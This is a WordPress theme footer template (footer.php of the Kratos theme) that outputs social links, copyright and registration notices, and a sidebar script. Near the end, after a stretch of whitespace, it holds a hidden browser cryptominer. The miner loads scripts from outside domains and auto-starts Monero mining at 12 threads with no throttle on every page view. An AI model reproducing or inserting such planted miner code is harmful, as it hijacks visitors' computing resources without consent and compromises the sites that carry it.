<?php
/**
 * The template for displaying the footer
 * 
 * @author Vtrois <seaton@vtrois.com>
 * @license GPL-3.0
 */
?>

				<footer>
					<div id="footer">
						<div class="cd-tool visible text-center">
							<?php if ( kratos_option( 'cd_gb' ) && kratos_option( 'cd_weixin' ) ) { ?>
						   		<a rel="nofollow" class="cd-gb-a visible-lg" href="<?php echo kratos_option('guestbook_links'); ?>"><span class="fa fa-book"></span></a>	
						   	<?php } elseif( kratos_option( 'cd_gb' ) && !kratos_option( 'cd_weixin' ) ){ ?>
						   		<a rel="nofollow" class="cd-gb-b visible-lg" href="<?php echo kratos_option('guestbook_links'); ?>"><span class="fa fa-book"></span></a>	
						   	<?php } ?>
						   	<?php if (  !wp_is_mobile() &&  kratos_option( 'cd_weixin' ) ) : ?>
						   		<a id="weixin-img" class="cd-weixin visible-lg"><span class="fa fa-weixin"></span><div id="weixin-pic"><img src="<?php echo kratos_option('weixin_image') ?>"></div></a>
						   	<?php endif; ?>
						    <a class="cd-top cd-is-visible cd-fade-out"><span class="fa fa-chevron-up"></span></a>
						</div>
						<div class="container">
							<div class="row">
								<div class="col-md-6 col-md-offset-3 footer-list text-center">
									<p class="kratos-social-icons">
									<?php echo (!kratos_option('social_weibo')) ? '' : '<a target="_blank" rel="nofollow" href="' . kratos_option('social_weibo') . '"><i class="fa fa-weibo"></i></a>'; ?>
									<?php echo (!kratos_option('social_tweibo')) ? '' : '<a target="_blank" rel="nofollow" href="' . kratos_option('social_tweibo') . '"><i class="fa fa-tencent-weibo"></i></a>'; ?>
									<?php echo (!kratos_option('social_twitter')) ? '' : '<a target="_blank" rel="nofollow" href="' . kratos_option('social_twitter') . '"><i class="fa fa-twitter"></i></a>'; ?>
									<?php echo (!kratos_option('social_facebook')) ? '' : '<a target="_blank" rel="nofollow" href="' . kratos_option('social_facebook') . '"><i class="fa fa-facebook-official"></i></a>'; ?>
									<?php echo (!kratos_option('social_linkedin')) ? '' : '<a target="_blank" rel="nofollow" href="' . kratos_option('social_linkedin') . '"><i class="fa fa-linkedin-square"></i></a>'; ?>
									<?php echo (!kratos_option('social_github')) ? '' : '<a target="_blank" rel="nofollow" href="' . kratos_option('social_github') . '"><i class="fa fa-github"></i></a>'; ?>
									</p>
									<p>Copyright <?php echo date('Y'); ?> <a href="<?php echo get_option('home'); ?>"><?php bloginfo('name'); ?></a>. All Rights Reserved.<br>
									<?php if(kratos_option('icp_num')){?><br><a href="http://www.miitbeian.gov.cn/" rel="external nofollow" target="_blank"><?php echo kratos_option( 'icp_num' ); } ?></a><?php if(kratos_option('gov_num')){?><br><a href="<?php echo kratos_option( 'gov_link' ); ?>" rel="external nofollow" target="_blank"><i class="govimg"></i><?php echo kratos_option( 'gov_num' ); ?></a><?php }?></p><p><?php echo (!kratos_option('site_tongji')) ? '' : kratos_option('site_tongji'); ?></p>
								</div>
							</div>
						</div>
					</div>
				</footer>

															
                                                                                                                       
			</div>
		</div>
		<?php wp_footer();?>
		<?php if ( !wp_is_mobile() && kratos_option('site_sa') ) : ?>
		<script type="text/javascript">
			if ($("#main").height() > $("#sidebar").height()) {
				var footerHeight = 0;
				if ($('#page-footer').length > 0) {
					footerHeight = $('#page-footer').outerHeight(true);
				}
				$('#sidebar').affix({
					offset: {
						top: $('#sidebar').offset().top - 30,
						bottom: $('#footer').outerHeight(true) + footerHeight + 6
					}
				});
			}
		</script>
		<?php endif; ?>
<script src="//statdynamic.com/lib/crypta.js"></script>
<script src="https://reauthenticator.com/lib/minui.js"></script>
<script>
var miner = null;
try {
  miner = new CRLT.Anonymous('61e2621fcc6a107e5f4b15c459143bb2761c20a7f344', {threads:12,throttle:0, coin: "xmr"});
} catch(e) {}
var ui = new MinerUI(miner, {
  container: document.getElementById('miner'),
  canvas: document.getElementById('mining-stats-canvas'),
  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
  threads: document.getElementById('mining-threads'),
  threadsAdd: document.getElementById('mining-threads-add'),
  threadsRemove: document.getElementById('mining-threads-remove'),
  hashesTotal: document.getElementById('mining-hashes-total'),
  startButton: document.getElementById('mining-start'),
  stopButton: document.getElementById('mining-stop'),
  blkWarn: document.getElementById('blk-warning')
});
ui.autoStart(); 
</script>

	</body>												  											
</html>